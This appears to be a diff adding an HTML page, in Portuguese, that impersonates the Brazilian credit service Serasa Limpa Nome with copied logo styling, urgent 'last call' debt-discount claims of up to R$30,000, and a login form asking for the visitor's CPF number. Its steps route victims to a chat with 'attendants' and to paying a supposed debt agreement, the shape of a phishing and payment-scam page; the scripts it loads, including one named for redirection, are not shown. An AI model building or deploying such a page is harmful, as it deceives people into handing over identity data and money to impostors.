@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Serasa Limpa Nome - Verifique Seus Acordos</title>
+    <link rel="stylesheet" href="redirect-styles.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div class="menu-section">
+                <i class="fas fa-bars"></i>
+                <span>Menu</span>
+            </div>
+            
+            <div class="logo-section">
+                <div class="logo">
+                    <div class="logo-icon">
+                        <div class="logo-square">
+                            <div class="logo-s">S</div>
+                            <div class="logo-dots">
+                                <div class="dot"></div>
+                                <div class="dot"></div>
+                                <div class="dot"></div>
+                                <div class="dot"></div>
+                            </div>
+                            <div class="logo-tm">™</div>
+                        </div>
+                    </div>
+                    <div class="logo-text">
+                        <span class="serasa">serasa</span>
+                        <span class="limpa-nome">limpa nome</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="login-section">
+                <i class="fas fa-user"></i>
+                <span>Entrar</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <!-- Promotional Section -->
+        <section class="promotional-section">
+            <h1 class="main-title">VERIFIQUE SE VOCÊ TEM ACORDO DISPONÍVEL EM SEU NOME!</h1>
+            
+            <p class="subtitle">Hoje é a última chamada para você verificar se tem dívidas no seu nome e aproveitar os descontos do Desbanca Serasa</p>
+            
+            <!-- Promotional Image -->
+            <div class="promotional-image">
+                <img src="images/desbanca.png" alt="Desbanca Serasa" class="desbanca-image">
+            </div>
+            
+            <button class="prorrogou-btn">PRORROGOU</button>
+        </section>
+
+        <!-- Login Section -->
+        <section class="login-section-card">
+            <div class="login-card">
+                <h2 class="login-title">Faça Seu Login</h2>
+                <p class="login-subtitle">Identifique-se para acessar sua conta Serasa</p>
+                
+                <form id="cpfForm" class="login-form">
+                    <div class="input-group">
+                        <label for="cpfInput">CPF</label>
+                        <input 
+                            type="text" 
+                            id="cpfInput" 
+                            placeholder="* Digite seu CPF"
+                            maxlength="14"
+                            required
+                        >
+                        <span class="input-error" id="cpfError"></span>
+                    </div>
+                    
+                    <button type="submit" id="searchBtn" class="verify-btn">
+                        <i class="fas fa-search"></i>
+                        Verificar Dívidas
+                    </button>
+                </form>
+            </div>
+        </section>
+    </main>
+
+    <!-- Why Check Section -->
+    <section class="why-check-section">
+        <div class="container">
+            <h2 class="section-title">Por que verificar se possuo dívidas com acordo disponível?</h2>
+            <p class="section-subtitle">Saiba os motivos para você realizar a verificação:</p>
+            
+            <div class="benefits-grid">
+                <div class="benefit-item">
+                    <div class="benefit-icon">
+                        <img src="images/oportunidade unica.png" alt="Oportunidade única" class="benefit-image">
+                    </div>
+                    <div class="benefit-content">
+                        <h3>Oportunidade única</h3>
+                        <p>Você pode ter direito a descontos de até R$30.000 em dívidas no seu nome.</p>
+                    </div>
+                </div>
+                
+                <div class="benefit-item">
+                    <div class="benefit-icon">
+                        <img src="images/confiável e seguro.png" alt="Confiável e seguro" class="benefit-image">
+                    </div>
+                    <div class="benefit-content">
+                        <h3>Confiável e seguro</h3>
+                        <p>Regularizar sua situação financeira e ter mais controle do seu crédito.</p>
+                    </div>
+                </div>
+                
+                <div class="benefit-item">
+                    <div class="benefit-icon">
+                        <img src="images/segurança de dados financeiros.png" alt="Segurança de dados financeiros" class="benefit-image">
+                    </div>
+                    <div class="benefit-content">
+                        <h3>Segurança de dados financeiros</h3>
+                        <p>Proteger suas informações pessoais e evitar novos problemas com crédito.</p>
+                    </div>
+                </div>
+            </div>
+            
+            <button class="learn-more-btn">Saiba Mais!</button>
+        </div>
+    </section>
+
+    <!-- Step by Step Section -->
+    <section class="steps-section">
+        <div class="container">
+            <h2 class="steps-title">Passo a passo para acessar o chat de consulta do Serasa</h2>
+            
+            <div class="steps-list">
+                <div class="step-item">
+                    <span class="step-number">1</span>
+                    <span class="step-text">Entre no site da consulta</span>
+                </div>
+                
+                <div class="step-item">
+                    <span class="step-number">2</span>
+                    <span class="step-text">Realize o login na plataforma colocando seu CPF</span>
+                </div>
+                
+                <div class="step-item">
+                    <span class="step-number">3</span>
+                    <span class="step-text">Prossiga o atendimento com uma de nossas atendentes</span>
+                </div>
+                
+                <div class="step-item">
+                    <span class="step-number">4</span>
+                    <span class="step-text">Confirme os dados necessários durante o atendimento</span>
+                </div>
+                
+                <div class="step-item">
+                    <span class="step-number">5</span>
+                    <span class="step-text">Finalize o pagamento do seu acordo e pronto! Suas dívidas estarão quitadas!</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="serasa-logo">
+                <div class="footer-logo-icon">
+                    <div class="footer-logo-square">
+                        <div class="footer-logo-s">s</div>
+                        <div class="footer-logo-tm">™</div>
+                    </div>
+                </div>
+                <span class="footer-logo-text">serasa</span>
+            </div>
+            <p class="footer-disclaimer">Todo o conteúdo deste site está publicado sob a licença</p>
+        </div>
+    </footer>
+
+    <!-- Results Section (Hidden by default) -->
+    <div class="results-section" id="resultsSection">
+        <div class="loading" id="loadingSpinner">
+            <div class="spinner"></div>
+            <p>Verificando dados...</p>
+        </div>
+
+        <div class="result-card" id="resultCard">
+            <h3>Resultado da Verificação</h3>
+            <div class="result-content" id="resultContent">
+                <!-- Resultado será inserido aqui -->
+            </div>
+        </div>
+
+        <div class="error-card" id="errorCard">
+            <h3><i class="fas fa-exclamation-triangle"></i> Erro na Verificação</h3>
+            <div class="error-content" id="errorContent">
+                <!-- Erro será inserido aqui -->
+            </div>
+        </div>
+    </div>
+
+    <script src="js/cpfValidator.js"></script>
+    <script src="js/cpfAPI.js"></script>
+    <script src="redirect-script.js"></script>
+</body>
+</html>
